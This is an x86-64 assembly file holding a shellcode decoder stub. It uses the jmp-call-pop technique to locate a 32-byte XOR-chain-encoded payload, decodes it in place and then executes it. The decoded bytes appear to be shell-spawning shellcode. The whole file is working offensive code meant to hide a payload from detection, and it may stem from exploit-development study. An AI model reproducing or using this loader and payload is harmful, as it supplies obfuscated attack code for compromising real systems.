BITS 64

KEY equ 'B'
LEN equ 32
global _start:
section .text

_start:
    jmp _get_pointer

_decode:
    pop rdi ; rdi points to encodedshellcode

    push KEY
    pop rsi
    xor rax, rax
    xor rcx, rcx
    cdq

_loop:
    
    cmp rcx, LEN
    jg EncodedShellcode

    mov al, [rdi] 
    xor al, sil
    mov sil, [rdi]
    mov [rdi], al


    inc rdi
    inc rcx
    jmp _loop

_get_pointer:
    call _decode
    EncodedShellcode: db 0xa,0x3b,0xfb,0xab,0xe3,0x58,0x77,0x15,0x7c,0x12,0x3d,0x12,0x61,0x9,0x5a,0x12,0x9b,0x7c,0x2c,0x64,0xed,0xf,0x58,0x10,0x99,0x7f,0x37,0xb4,0x74,0x4f,0x40,0x45
